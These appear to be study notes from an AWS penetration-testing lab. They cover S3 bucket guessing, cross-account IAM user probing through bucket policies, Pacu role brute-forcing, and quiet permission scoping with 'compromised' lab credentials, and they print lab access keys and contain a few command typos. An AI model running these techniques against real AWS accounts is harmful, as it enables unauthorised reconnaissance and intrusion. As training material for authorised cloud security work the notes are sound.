# Enumerating AWS Cloud Infreastructure
1. Reconnaissance of Cloud Resources on the Internet
2. Reconnaissance via Cloud Service Provider's API
3. Initial IAM Reconnaissance
4. IAM Resources Enumeration
- [Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)

## Reconnaissance of Cloud Resources on the Internet
-  Cloud  Article [NIST](https://nvlpubs.nist.gov/nistpubs/legacy/sp/nistspecialpublication800-145.pdf)
### Accessing the Lab
- Add the IP address into the /etc/resolv.conf
```bash
nano /etc/resolv.conf
# Generated by NetworkManager
nameserver <AWS IP>
nameserver 1.1.1.1 #system IP
```
- Testing the DNS configuration in Kali using host tool
```powershell
host www.offseclab.io 44.205.254.229 # IP given in AWS lab
host www.offseclab.io # It will give the IP addess
```
### Domain and Subdomain Reconnaissance
- Querying Nameserver Records of offseclab.io Domain
```
host -t ns www.offseclab.io
```
- Getting the Registrar Information of awsdns-00.com Domain
```
whois awsdns-00.com | grep "Registrant Organization"  # aws addess given in the above command
```
- Getting the Public IP address of www.offseclab.io, After adding into /etc/resolv.conf
```
host www.offseclab.io
```
- Getting Details of the Public IP Address of the Website
```
host 52.70.117.69 # IP address provided in the ahove host command
whois 52.70.117.69 | grep "OrgName"
```
-  Using dnsenum to Automate DNS Reconnaissance of offseclab.io Domain
```
dnsenum offseclab.io --threads 100
```


### Service-specific Domains
- Access the website in the browser www.offseclab.io
- Go the inspect tab check the Network tab refresh the page
- Observe the images or CDNs are loading from the AWS S3 buckets
- Path like this offseclab-assets-public-axevtewi/sites/www/images/amethyst.png, Try to play with this offseclab-assets-**public**-axevtewi
- Instead of the public try to change private, dev check weather you have access or not.

|AWS|Azure|GCP|
|:-|:-|:-|
|s3.amazonaws.com |wefile.core.windows.netb.core.windows.net |appspot.com |
|awsapps.com |	file.core.windows.net | storage.googleapis.com|
| |blob.core.windows.net | |
| |azurewebsites.net | |
| |	cloudapp.net | |

- Kali Linux has official repository cloud-enum
```
sudo apt install cloud-enum # Installing
cloud_enum --help # Help Menu
```
-  Running Quick Scan Against offseclab-assets-public-axevtewi Bucket Using cloud_enum in AWS
```
cloud_enum -k offseclab-assets-public-axevtewi --quickscan --disable-azure --disable-gcp
```
- Making a Dictionary of Keywords to Search S3 Buckets
```
for key in "public" "private" "dev" "prod" "development" "production"; do echo "offseclab-assets-$key-axevtewi"; done | tee /tmp/keyfile.txt
```
- Running cloud_enum Against The Generated keyfile.txt File
```
cloud_enum -kf /tmp/keyfile.txt -qs --disable-azure --disable-gcp
```

## Reconnaissance via Cloud Service Provider's API



### Preparing the Lab - Configure AWS CLI
- Installing AWS CLI in Kali Linux
```bash
sudo apt update
sudo apt install -y awscli
```
- Configuring Profile and Validating Communication with AWS API
- Details are given in the lab
```bash
aws configure --profile attacker
>AKIAQO...
>cOGzm...
>us-east-1
>json
aws --profile attacker sts get-caller-identity
```

### Publicly Shared Resources
- Listing All Public AMIs Owned by Amazon AWS
```
aws --profile attacker ec2 describe-images --owners amazon --executable-users all
```
- Listing All Public AMIs After Filtering the List Using the Keyword "description"
```
aws --profile attacker ec2 describe-images --executable-users all --filters "Name=description,Values=*Offseclab*"
```
-  Listing All Public AMIs After Filtering the List Using the Keyword "name"
```
aws --profile attacker ec2 describe-images --executable-users all --filters "Name=name,Values=*Offseclab*"
aws --profile attacker ec2 describe-snapshots --filters "Name=description,Values=*offseclab*" # Snapshot description
```



### Obtaining Account IDs from S3 Buckets
- Getting the Name of the Public Bucket with curl
```
curl -s www.offseclab.io | grep -o -P 'offseclab-assets-public-\w{8}'
```
- Listing the Public Bucket as the attacker
```
aws --profile attacker s3 ls offseclab-assets-public-kaykoour
```
- Creating the IAM User "enum" and Generating AccessKeyId and SecretAccessKey for that User
```bash
aws --profile attacker iam create-user --user-name enum
aws --profile attacker iam create-access-key --user-name enum
```
- Configuring AWS CLI with Profile "enum"
- Below values provided in the above commands
```bash
aws configure --profile enum
>AKIAQOMAIGYURE7QCU
>Pxt+Qz9V5baGMF/x0sCNz/SQoSfdq0C+wBzZgwvb
>us-east-1
>json
aws sts get-caller-identity --profile enum
```
- Listing the Private Bucket with the enum User
```
aws --profile enum s3 ls offseclab-assets-private-kaykoour
# An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied  
```
- File policy-s3-read.json.
```bash
{
     "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowResourceAccount",
            "Effect": "Allow",
            "Action": [
                "s3:ListBucket",
                "s3:GetObject"
            ],
            "Resource": "*",
            "Condition": {
                "StringLike": {"s3:ResourceAccount": ["0*"]}
            }
        }
    ]
}
```
- Attaching the s3-read Inline Policy to the enum IAM User
```bash
aws --profile attacker iam put-user-policy --user-name enum --policy-name s3-read --policy-document file://policy-s3-read.json
aws --profile attacker iam list-user-policies --user-name enum
```
- Changing the Condition in the Policy and Testing Again
- Instead of 0 to 1
```bash
kali@kali:~$ aws --profile enum s3 ls offseclab-assets-private-kaykoour

# An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied  

kali@kali:~$ nano policy-s3-read.json

kali@kali:~$ cat -n policy-s3-read.json 
     1  {
     2      "Version": "2012-10-17",
     3      "Statement": [
     4          {
     5              "Sid": "AllowResourceAccount",
     6              "Effect": "Allow",
     7              "Action": [
     8                  "s3:ListBucket",
     9                  "s3:GetObject"
    10              ],
    11              "Resource": "*",
    12              "Condition": {
    13                  "StringLike": {"s3:ResourceAccount": ["1*"]}
    14              }
    15          }
    16      ]
    17  }

kali@kali:~$ aws --profile attacker iam put-user-policy --user-name enum --policy-name s3-read --policy-document file://policy-s3-read.json

kali@kali:~$ aws --profile enum s3 ls offseclab-assets-private-kaykoour
                 #          PRE sites/
```

### Enumerating IAM Users in Other Accounts


Typically, we use the AWS Resource Name (ARN) to specify an IAM identity, as shown below:
```
"Principal": {
  "AWS": ["arn:aws:iam::AccountID:user/user-name"]
}
```
Create S3 bucket with Random number
```
aws --profile attacker s3 mb s3://offseclab-dummy-bucket-$RANDOM-$RANDOM-$RANDOM
#offseclab-dummy-bucket-28967-25641-13328
```
By default, the newly-created bucket is private. Now we are going to define a policy document in which we'll grant read permission only to a specific IAM user in the target account. We can use any text editor 
of our preference to write the policy. We'll use the ARN we crafted earlier to test if the cloudadmin user exists in the account 123456789012.

```bash
nano grant-s3-bucket-read.json
cat grant-s3-bucket-read.json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowUserToListBucket",
            "Effect": "Allow",
            "Resource": "arn:aws:s3:::offseclab-dummy-bucket-28967-25641-13328",
            "Principal": {
                "AWS": ["arn:aws:iam::123456789012:user/cloudadmin"]
            },
            "Action": "s3:ListBucket"

        }
    ]
}
```
Checking the Above policy with valid user, If no error returns after running the command, our policy was applied successfully. This also means that the cloudadmin user exists in the target account.
```
aws --profile attacker s3api put-bucket-policy --bucket offseclab-dummy-bucket-28967-25641-13328 --policy file://grant-s3-bucket-read.json
```
Update the policy added the no existed used 

```bash
nano grant-s3-bucket-read-userDoNotExist.json
cat grant-s3-bucket-read-userDoNotExist.json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowUserToListBucket",
            "Effect": "Allow",
            "Resource": "arn:aws:s3:::offseclab-dummy-bucket-28967-25641-13328",
            "Principal": {
                "AWS": ["arn:aws:iam::123456789012:user/nonexistant"]
            },
            "Action": "s3:ListBucket"

        }
    ]
}
```
Checking the Above policy with Non valid user, If no error returns after running the command, our policy was applied successfully. This also means that the cloudadmin user exists in the target account.
```bash
aws --profile attacker s3api put-bucket-policy --bucket offseclab-dummy-bucket-28967-25641-13328 --policy file://grant-s3-bucket-read-userDoNotExist.json
# Error An error occurred (MalformedPolicy) when calling the PutBucketPolicy operation: Invalid principal in policy
```
Trying to check existing crafted sample user names
```bash
echo -n "lab_admin
security_auditor
content_creator
student_access
lab_builder
instructor
network_config
monitoring_logging
backup_restore
content_editor" > aws-role-names.txt
```
[Pacu](https://github.com/RhinoSecurityLabs/pacu): The Open Source AWS Exploitation Framework
```bash
sudo apt update
sudo apt install pacu
pacu -h
pacu # It prompt for would like to name this new session?
Pacu(No Keys Set)>import_keys attacker # attacker profile is already set in the AWS CLI
Pacu>ls # it will all the options
Pacu>help iam__enum_roles # Helpoptions
Pacu>run iam__enum_roles --word-list /tmp/role-names.txt --account-id 123456789012 #this is the enum user account ID Identified "lab_admin" 
# Tasked to add the add the "saphire", "ruby", and "amethyst" starting of the in aws-role-names.txt
Pacu>run iam__enum_roles --word-list /tmp/role-names.txt --account-id 123456789012 # Identified amethyst-lab_admin
```
Tasked to find VPC configuration user identified in the above (user:amethyst-lab_admin) it will provide Session ID, Session Key, Session token export these details

```bash
# First export these 3 details of the user-amethyst-lab_admin identified in the above command
export AWS_ACCESS_KEY_ID=ASIAT7HC76KDHAY56JLG
export AWS_SECRET_ACCESS_KEY=KlS9b8fZMj72nCfTsdhcwex/7mrH1PGdnLB1ZCBi
export AWS_SESSION_TOKEN=FwoGZXI---TRUNKATED--SfTktvIrSwwA==
#Run this command identify the VPC configuration for user-amethyst-lab_admin
aws ec2 describe-vpcs --region us-east-1
```


## Initial IAM Reconnaissance
1. Examining Compromised Credentials
2. Scoping IAM permissions
- At this stage, we won't begin enumerating resources. Instead, we'll focus on gathering initial information from the compromised credentials, including understanding the scope of access within the AWS environment. We'll explore various techniques for this, some stealthy and others less so.

### Accessing the Lab
> After deploying the lab we'll receive credentials to interact with AWS as three different users.
1. The **target user** will simulate the compromised access to the cloud environment. This is the user we'll use most often while learning techniques to get information from this initial access.
2. The **challenge user** is an auxiliary user with very limited access that we'll use to test concepts and execute additional tasks, validating our newly learned skills.
3. The **monitor user** will simulate an operator with access to Cloudtrail, the AWS logging service.
- For the moment let's start the lab deployment and take note of this information. We can organize the data as follows:
- Credentials access as the target user.
     - Target ACCESS KEY ID
     - Target SECRET ACCESS KEY
- Credentials access as the challenge user.
     - Challenge ACCESS KEY ID
     - Challenge SECRET ACCESS KEY
- Credentials to access as the monitor user.
     - Management Console login URL
     - Username
     - Password

### Examining Compromised Credentials
- configure the target user profile, details given in the lab
```powershell
aws configure --profile target
aws --profile target aws sts get-caller-identity
# Account ID - 619071316869
```
- configure the challenge user profile, details given in the lab
```powershell
aws configure --profile challenge
aws --profile challenge sts get-caller-identity
# Account ID - 619071316869 same as target
```
- Getting the account ID from access keys with the get-access-key-info command
```
aws --profile challenge sts get-access-key-info --access-key-id AKIAQOMAIGYUVEHJ7--M
```
- Penetration testers can also use the get-access-key-info subcommand to determine whether or not a compromised credential is inside the scope of the assessment.
- Another stealthy approach is to abuse error messages that aren't logged by default in the Cloudtrail event history. For example, let's try invoking a nonexistent Lambda function using the compromised credentials.
```bash
aws --profile target lambda invoke --function-name arn:aws:lambda:us-east-1:619071316869:function:nonexistent-function outfile
#An error occurred (AccessDeniedException) when calling the Invoke operation: User: arn:aws:iam::619071316869:user/support/clouddesk-plove is not authorized to perform: lambda:InvokeFunction on resource: arn:aws:lambda:us-east-1:619071316869:function:nonexistent-function because no identity-based policy allows the lambda:InvokeFunction action
```
#### CloudTrail
- Check the logs in CloudTrail login to account credentials provided in lab for the region [us-east-1](https://us-east-1.console.aws.amazon.com/cloudtrail/home?region=us-east-1#/events?EventName=GetCallerIdentity&CustomTime=1800000)
- In the search CloudTrail -> Left Menu -> Event History tab 

- Executing an API request to another region
- Check the cloud trail logs on [us-east-2](https://us-east-2.console.aws.amazon.com/cloudtrail/home?region=us-east-2#/events?EventName=GetCallerIdentity&CustomTime=1800000)
```
aws --profile target sts get-caller-identity --region us-east-2
```


### Scoping IAM permissions
- All cloud providers implement some kind of authentication and authorization mechanisms to ensure that users can only interact with the provider's API within their designated permissions and cannot act on behalf of other users or accounts. All these mechanisms are commonly grouped under the umbrella term Identity and Access Management (IAM).

- The Principle of Least Privilege (PoLP) is generally followed as a best practice for any cloud deployment. This principle suggests granting users only the permissions they need to perform their tasks, and nothing more. This will reduce actions that can be performed and limit potential attack vectors that an attacker can exploit from a compromised account. However, overly-permissive identities are still a common finding and the major cause of breaches in cloud environments.

- Continuing in the lab, we'll again take on the role of an attacker to determine the extent of permissions associated with the compromised credentials in the target environment.
```bash
aws --profile target aws sts get-caller-identity
# "Arn": "arn:aws:iam::619071316869:user/support/clouddesk-plove"
```
- This suggests the purpose of the user and what permissions they likely have. For example, "clouddesk" and "support" may tell us that the user has some IAM-related privileges to grant access or reset credentials. This type of hypothesis is helpful as it's extra information we've gained while maintaining a low profile.

- We can list inline policies and managed policies associated with IAM user
```bash
aws --profile target iam list-user-policies --user-name clouddesk-plove # Nothing returned
aws --profile target iam list-attached-user-policies --user-name clouddesk-plove
# "PolicyName": "deny_challenges_access",
#"PolicyArn": "arn:aws:iam::619071316869:policy/deny_challenges_access"
```
- Listing the groups to which the user belongs.
```bash
aws --profile target iam list-groups-for-user --user-name clouddesk-plove
# Output
{
    "Groups": [
        {
            "Path": "/support/",
            "GroupName": "support",
            "GroupId": "AGPAZAI4GUOCZBYDLSXUW",
            "Arn": "arn:aws:iam::619071316869:group/support/support",
            "CreateDate": "2024-11-27T02:58:08+00:00"
        }
    ]
}
```
- Now we have discovered that IAM user belong to the one group that is Support group
- Now we will check for policies associated with the support group, we'll search for inline and managed policies in a search similar to one we ran previously.
```bash
aws --profile target iam list-group-policies --group-name support # Nothing returned
aws --profile target iam list-attached-group-policies --group-name support
# "PolicyName": "SupportUser",
# "PolicyArn": "arn:aws:iam::aws:policy/job-function/SupportUser"
```
- Listing a policy version
```bash
aws --profile target iam list-policy-versions --policy-arn "arn:aws:iam::aws:policy/job-function/SupportUser"
# Consider most recent version  "VersionId": "v8"
```
- Listing a policy definition by its version
- Some of these elements define a specific action. For example, acm:DescribeCertificate defines the DescribeCertificate action for the AWS Certificate Manager service. Other elements use the "*" wildcard to describe any action that starts with read-only keywords such as Get, Describe and, List. These actions are allowed to run against any resource of the given services as stated in the "Resource": "*" line.
```bash
aws --profile target iam get-policy-version --policy-arn arn:aws:iam::aws:policy/job-function/SupportUser --version-id v8
# "Effect": "Allow",
# "Resource": "*"
```
#### Task
- Use the challenge Profile in AWS CLI to scope the level of actions allowed to run in the EC2 service. Run the permitted actions to list or describe Resources. You will find a Tag Key named proof in one of the resources you can list. Enter the value of the Tag Key.
- **Hint** We need to focus on actions that list/describe resources. We can also use tools like pacu to find allowed actions by brute force.
```bash
aws --profile challenge ec2 describe-vpcs
aws --profile challenge ec2 describe-vpcs --query "Vpcs[].Tags[?Key=='proof']"
```

## IAM Resources Enumeration
1. Choosing Between a Manual or Automated Enumeration Approach
2. Enumerating IAM Resources
3. Processing API Response data with JMESPath
4. Running Automated Enumeration with Pacu
5. Extracting Insights from Enumeration Data

### Choosing Between a Manual or Automated Enumeration Approach
- Several commercial and open-source tools have been developed to perform information gathering against cloud-based infrastructures. Some of these tools are tailored towards specific cloud providers, while others support multiple providers. Some are GUI-based and some run from the command line. Some are automated and some require manual intervention.
> Most tools generate significant log events and may trigger monitoring systems. This may not be a significant consideration when performing a red team assessment or a penetration test in which stealth is not a requirement, but when stealth is a factor, we must test our tools to determine the potential impact prior to an engagement.

### Enumerating IAM Resources
- As we begin to enumerate IAM resources, we'll start our scenario in possession of an already-compromised account. Let's summarize what we have already learned from the compromised credentials.

| Resource Type | Name | ARN |
|:-|:-|:-|
|IAM::User |clouddesk-plove |arn:aws:iam::123456789012:user/support/clouddesk-plove |
|IAM::Group |Support |arn:aws:iam::123456789012:group/support/support |
|IAM::Policy |SupportUser |arn:aws:iam::aws:policy/job-function/SupportUser |

> AWS custom-managed policies allow users to define a set of permissions that can be reused and associated with multiple IAM users, groups, or roles. While these policies offer flexibility for IAM management, there is an inherent security risk if they are crafted to be overly permissive.
- SupportUser is an AWS custom-managed policy that grants permissions to troubleshoot and resolve issues in an AWS account. This policy grants read-only access to explore several services.
- Again started lab configuring above [steps](https://github.com/ashok5141/OSCP/blob/main/AWS_Security.md#examining-compromised-credentials)
- Let's check what actions this policy grants to enumerate IAM resources. To do this we'll run iam get-policy-version to show the policy definition. We'll pipe the output to grep to filter and display only the lines that contain the string iam.
```bash
aws --profile target iam get-policy-version --policy-arn arn:aws:iam::aws:policy/job-function/SupportUser --version-id v8 | grep "iam"
```
- With this policy, we can run any iam subcommand that starts with get and list and two other specific actions. To list the available subcommands in AWS CLI we can use the help option.
- Let's run aws iam help to display a description of the command usage including a list of all available subcommands. We'll also add | grep -E "list-|get-|generate-" to filter all the lines that include the words "list-", "get-" and "generate-".
```
aws --profile target iam help | grep -E "list-|get-|generate-"
```
- IAM is a critical component of AWS that manages all actions related to the authentication and authorization of identities. Having this level of access, even through it's read-only access, is a big deal.
We won't cover the list of subcommands in this lab. However, we could learn about any of them running `aws iam command help`. This will show details about the subcommands and their basic usage, including the required and optional parameters.
- Let's start by getting a summary of the IAM-related information in the account. We'll run `aws I am get-account-summaary` with no additional arguments and put it into the json format
```bash
aws --profile target iam get-account-summary | tee account-summary.json
{
  "SummaryMap": {
    "GroupPolicySizeQuota": 5120,
    "InstanceProfilesQuota": 1000,
    "Policies": 8,
    "GroupsPerUserQuota": 10,
    "InstanceProfiles": 0,
    "AttachedPoliciesPerUserQuota": 10,
    "Users": 18,
    "PoliciesQuota": 1500,
    "Providers": 1,
    "AccountMFAEnabled": 0,
    "AccessKeysPerUserQuota": 2,
    "AssumeRolePolicySizeQuota": 2048,
    "PolicyVersionsInUseQuota": 10000,
    "GlobalEndpointTokenVersion": 1,
    "VersionsPerPolicyQuota": 5,
    "AttachedPoliciesPerGroupQuota": 10,
    "PolicySizeQuota": 6144,
    "Groups": 8,
    "AccountSigningCertificatesPresent": 0,
    "UsersQuota": 5000,
    "ServerCertificatesQuota": 20,
    "MFADevices": 0,
    "UserPolicySizeQuota": 2048,
    "PolicyVersionsInUse": 28,
    "ServerCertificates": 0,
    "Roles": 21,
    "RolesQuota": 1000,
    "SigningCertificatesPerUserQuota": 2,
    "MFADevicesInUse": 0,
    "RolePolicySizeQuota": 10240,
    "AttachedPoliciesPerRoleQuota": 10,
    "AccountAccessKeysPresent": 0,
    "AccountPasswordPresent": 1,
    "GroupsQuota": 300
  }
}
```
- The output shows some information that is more relevant for administrators such as resource quotas, but it also shows insights about the number of IAM resources created in the account such as Users, Roles, Groups and Policies.
- Let's continue enumerating all IAM identities list-users, list-groups and list-roles subcommand
```bash
aws --profile target iam list-users | tee users.json
aws --profile target iam list-groups | tee groups.json
aws --profile target iam list-roles | tee roles.json
```
- We can list all managed policies with list-policies. We'll use --scope Local to display only the Customer Managed Policies and omit the AWS Managed Policies, and we'll use --only-attached to list the policies that are attached to an IAM identity.
```bash
aws --profile target iam list-policies --scope Local --only-attached | tee Policies.json
```
- Next, to get the inline policies for every identity associated with the compromised credentials, we could run the following subcommand:
     - list-user-policies
     - get-user-policy
     - list-group-policies
     - get-group-policy
     - list-role-policies
     - get-role-policy
- Similarly, we can check for all managed policies with the following subcommand:
     - list-attached-user-policies
     - list-attached-group-policies
     - list-attached-role-policies
> In order to execute get-account-authorization-details, the account running the command must have the GetAccountAuthorizationDetails permission attached to its policy. While it's not common to find this permission exclusively on a policy, it is included when a wildcard is used for all get permissions (iam:Get*) which is common.
```bash
aws --profile target iam get-account-authorization-details --filter User Group LocalManagedPolicy Role | tee account-authorization-details.json
```
- Let's check something curious about the user authorization details we discovered.
- User clouddesk-plove IAM user is associated with a policy that denies access to certain resources.
```bash
aws --profile target iam list-attached-user-policies --user-name clouddesk-plove
{
    "AttachedPolicies": [
        {
            "PolicyName": "deny_challenges_access",
            "PolicyArn": "arn:aws:iam::238741419615:policy/deny_challenges_access"
        }
    ]
}
```
- We identified one managed policy (named deny_challenges_access) associated with the user. To understand the policy's function, we need to read its policy document. Let's take the ARN of policy and attempt to list version to gain further insights.
```bash
aws --profile target iam list-policy-versions --policy-arn arn:aws:iam::238741419615:policy/deny_challenges_access
# An error occurred (AccessDenied) when calling the ListPolicyVersions operation: User: arn:aws:iam::238741419615:user/support/clouddesk-plove is not authorized to perform: iam:ListPolicyVersions on resource: policy arn:aws:iam::238741419615:policy/deny_challenges_access with an explicit deny in an identity-based policy
```
- This error message, indicating that the operation is "explicitly denied" suggests that the administrator restricted this user's access to certain resources.
- Let's check interesting  **get-account-authorization-details -- filter LocalManagedPolicy** to retrive all the custom managed policies of the account and browse the list until we find the details of the **deny_challenges_access** policy.
```bash
aws --profile target iam get-account-authorization-details --filter LocalManagedPolicy
```
- FInd users from the group
```bash
aws --profile target iam get-group --group-name ruby_dev
```

### Processing API Response data with JMESPath
- As previously mentioned, we have been using the aws client which produces JSON output by default. In this section, we will process the JSON output with [JMESPath](https://jmespath.org/) .
- In this section, we'll learn some basic querying using JMESPath by running some examples against the output of the iam **get-account-authorization-details** subcommand.

```bash
aws --profile target iam get-account-authorization-details --filter User
{
    "UserDetailList": [
        {
            "Path": "/admin/",
            "UserName": "admin-alice",
            "UserId": "AIDATPFQY6ZP6V2CMANTY",
            "Arn": "arn:aws:iam::238741419615:user/admin/admin-alice",
            "CreateDate": "2024-12-04T18:12:11+00:00",
            "GroupList": [
                "amethyst_admin",
                "admin"
            ],
            "AttachedManagedPolicies": [],
            "Tags": [
                {
                    "Key": "Project",
                    "Value": "amethyst"
                },
                {
                    "Key": "ce1df3c0-33f8-4eac-bb8a-356a133b3ac0",
                    "Value": "ce1df3c0-33f8-4eac-bb8a-356a133b3ac0"
                }
            ]
        }
  -------Truncated----
}
```
- Now, Let's query only for the UserName keys for all the objects. This is a perfect opportunity to use a "UserDetailList[].UserName"
```bash
aws --profile target iam get-account-authorization-details --filter User --query "UserDetailList[].UserName"
[
    "admin-alice",
    "admin-cbarton",
    "admin-srogers",
    "admin-tstark",
    "challenge",
    "clouddesk-bob",
    "clouddesk-fruiz",
    "clouddesk-plove",
    "dev-ballen",
    "dev-csandiego",
    "dev-ddory",
    "dev-jreyes",
    "dev-mmurdock",
    "dev-mwindu",
    "dev-prince",
    "dev-rboggs",
    "dev-shedgehog",
    "monitoring"
]
```
- Filter some specific fields
```bash
aws --profile target iam get-account-authorization-details --filter User --query "UserDetailList[0].UserName,Path,GroupList]"
[
    "admin-alice",
    "/admin/",
    [
        "amethyst_admin",
        "admin"
    ]
]
```
- With parameter names
```bash
aws --profile target iam get-account-authorization-details --filter User --query "UserDetailList[0].{Name: UserName,Path: Path,Groups: GroupList}"
{
    "Name": "admin-alice",
    "Path": "/admin/",
    "Groups": [
        "amethyst_admin",
        "admin"
    ]
}
```
- For example, let's list all the IAM Users whose usernames contain the word admin. We would use the UserDetailList[?contains(UserName, 'admin')] expression. Let's run that now.
```bash
aws --profile target iam get-account-authorization-details --filter User --query "UserDetailList[?contains(UserName, 'admin')].{Name: UserName}" 
[
    {
        "Name": "admin-alice"
    },
    {
        "Name": "admin-cbarton"
    },
    {
        "Name": "admin-srogers"
    },
    {
        "Name": "admin-tstark"
    }
]
```
- If the two expressions are written separately the expressions would be UserDetailList[?Path=='/admin/'].UserName and GroupDetailList[?Path=='/admin/'].GroupName. Let's build a JSON object with the desired elements. The Listing below shows the JSON object. Notice that we must use the --filter User Group argument to also obtain the Group objects.
```powershell
aws --profile target iam get-account-authorization-details --filter User Group --query "{Users: UserDetailList[?Path=='/admin/'].UserName, Groups: GroupDetailList[?Path=='/admin/'].{Name: GroupName}}"
{
    "Users": [
        "admin-alice"
    ],
    "Groups": [
        {
            "Name": "admin"
        }
    ]
}
```

#### Task
- What JMESPath expression will filter and display all users that contain the word "admin" in the Username and the Path fields? (Write only the JMESPath expression starting with "?". Use the contains function for both conditions. Example: ?contains(Path,'admin') ... )
```powershell
aws --profile target iam get-account-authorization-details --filter User --query "UserDetailList[?contains(UserName,'admin') && contains(Path,'admin')].{Name: UserName}"
[
    {
        "Name": "admin-alice"
    }
]
```

### Running Automated Enumeration with Pacu
- In this section, we'll explore some of pacu's enumeration modules as a case study for automated AWS enumeration. The goal of automation is to not only to streamline our work but more importantly to help us better understand the process and even build our own tools and workflows
```powershell
sudo apt update
sudo apt install pacu
```
- Now let's run help iam__enum_users_roles_policies_groups to learn about this module.
```powershell
help iam__enum_users_roles_policies_groups
```
- This module works similarly to the get-account-authorization-details subcommand
```powershell
run iam__enum_users_roles_policies_groups
[iam__enum_users_roles_policies_groups] MODULE SUMMARY:
  18 Users Enumerated
  21 Roles Enumerated
  8 Policies Enumerated
  8 Groups Enumerated
  IAM resources saved in Pacu database.
```
- To display a list of services that have collected data in the current session we'll run the services command. Then we can run the data <service> command to display all data for the specified service in the session.
```powershell
services
data IAM
```
### Extracting Insights from Enumeration Data
- Let's start with an obvious path. We'll analyze the admin-alice IAM user's data from the output of the get-account-authorization-details IAM subcommand.
```powershell
aws --profile target iam get-account-authorization-details --filter User Group --query "UserDetailList[?UserName=='admin-alice']"
```
> Attribute-Based Access Control (ABAC) is an authorization strategy in which a subject's permission to perform a set of operations is determined by evaluating attributes associated with that subject. Tags are commonly used as attributes to implement ABAC in public cloud environments.
```powershell
aws --profile target iam get-account-authorization-details --filter User Group --query "GroupDetailList[?GroupName=='admin']"
aws --profile target iam get-account-authorization-details --filter User Group --query "GroupDetailList[?GroupName=='amethyst_admin']"
```
- Let's **get-account-authorization-details** IAM subcommand to get this information.
```powershell
aws --profile target iam get-account-authorization-details --filter LocalManagedPolicy --query "Policies[?PolicyName=='amethyst_admin']"
```


# AWSPX graph view with neo4j like bloodhound
- [awspx](https://github.com/WithSecureLabs/awspx) is an opensource tool developed by FSecure, which analyses access paths within AWS and help to visualize access control relationships and discover potential attack paths between AWS resources.
- Similar tool [PMapper](https://github.com/nccgroup/PMapper) explore to list
![alt text](https://raw.githubusercontent.com/wiki/FSecureLABS/awspx/uploads/Awspx.gif?raw=true)

```bash
git clone https://github.com/FSecureLABS/awspx.git
cd awspx
sudo ./INSTALL # It'll create the docker container
awspx ingest # It prompt for AWS access key and secret key and region the format JSON, the it will generate the .zip file in /opt/awspx
awspx db --load-zip sample.zip # It will generate the file don't rename the file
awspx attacks
```
# Attacking AWS Cloud Infrastructure
- Continuous Integration (CI) and Continuous Delivery (CD) systems are vital components of modern cloud-based environments, including those on AWS. These systems facilitate the automated, repeatable, and tested deployment of applications, ensuring greater stability and efficiency. To achieve this, CI/CD pipelines must have access to application source code, secrets, and various AWS services and environments for deployment.
- However, the integration of these systems into AWS environments expands their attack surface, making CI/CD pipelines a prime target for malicious actors. Compromising a vulnerable CI/CD system within AWS can lead to privilege escalation, allowing attackers to move deeper into the cloud infrastructure.
- Because CI/CD systems are massive targets for attackers, organizations like OWASP have created "Top 10" lists for the biggest security risks in CI/CD systems, shown below. These lists help organizations identify and mitigate vulnerabilities that could be exploited within their AWS infrastructure.
     1. CICD-SEC-1: Insufficient Flow Control Mechanisms
     2. CICD-SEC-2: Inadequate Identity and Access Management
     3. CICD-SEC-3: Dependency Chain Abuse
     4. CICD-SEC-4: Poisoned Pipeline Execution (PPE)
     5. CICD-SEC-5: Insufficient PBAC (Pipeline-Based Access Controls)
     6. CICD-SEC-6: Insufficient Credential Hygiene
     7. CICD-SEC-7: Insecure System Configuration
     8. CICD-SEC-8: Ungoverned Usage of 3rd Party Services
     9. CICD-SEC-9: Improper Artifact Integrity Validation
     10. CICD-SEC-10: Insufficient Logging and Visibility
  
![alt text](https://raw.githubusercontent.com/ashok5141/OSCP/refs/heads/main/Images/CICD%20security1.png?raw=true)
- This Module is divided into two parts: the first half focused on the
    - **Leaked Secrets to Poisoned Pipeline**, and the second half about
    - **Dependency Chain Abuse**.
- In order to maintain a consistent lab, we won't be covering CICD-SEC-8 as it requires a third-party service, such as GitHub. However, the concepts we'll examine can also be applied to that risk. Furthermore, won't be covering CICD-SEC-10 because visibility requires manual intervention, which is out of scope for this Module.
- In the first part, we will focus on CICD-SEC-4: Poisoned Pipeline Execution (PPE), CICD-SEC-5: Insufficient PBAC (Pipeline-Based Access Controls), and CICD-SEC-6: Insufficient Credential Hygiene.
- Poisoned Pipeline Execution (PPE) is when an attacker gains control of the build/deploy script, potentially leading to a reverse shell or secret theft.
- Insufficient Pipeline-Based Access Controls (PBAC) means the pipeline lacks proper protection of secrets and sensitive assets, which can lead to compromise.
- Insufficient Credential Hygiene refers to weak controls over secrets and tokens, making them vulnerable to leaks or escalation.
- Lastly, we'll exploit an AWS S3 bucket misconfiguration to access Git credentials, modify the pipeline, and inject a payload to steal secrets and compromise the environment.
- In the second half of this module, we'll cover CICD-SEC-3: Dependency Chain Abuse, CICD-SEC-5: Insufficient Pipeline-Based Access Controls, CICD-SEC-7: Insecure System Configuration, and CICD-SEC-9: Improper Artifact Integrity Validation.
- Dependency Chain Abuse occurs when a malicious actor tricks the build system into downloading harmful code, either by hijacking an official dependency or creating similarly named packages.
- Insufficient Pipeline-Based Access Controls means pipelines have excessive permissions, making systems vulnerable to compromise.
- Insecure System Configuration involves misconfigurations or insecure code in pipeline applications.
- Improper Artifact Integrity Validation allows attackers to inject malicious code into the pipeline without proper checks.
- These risks, highlighted by OWASP, often overlap and serve as general guidelines for potential pipeline vulnerabilities.
- In this module, we'll find public info referencing a dependency missing from the public repository. We'll exploit this by publishing a malicious package, which will be downloaded by the builder, allowing our code to run in production.
- Once in production, we'll scan the network, discover more services, and tunnel into the automation server. There, we'll create an account, exploit a plugin vulnerability to get AWS keys, and continue until we find an S3 bucket with a Terraform state state file containing admin AWS keys.
- As mentioned, we'll cover the material in two halves during this Learning Module. We will explore the following Learning Units:
     - Leaked Secrets to Poisoned Pipeline:
          - Lab Design
          - Information Gathering
          - Dependency Chain Attack
          - Compromising the Environment
     - Dependency Chain Abuse:
          - Information Gathering
          - Dependency Chain Attack
          - Compromising the Environment
## About the Public Cloud Labs
- Directly accessible without using VPN

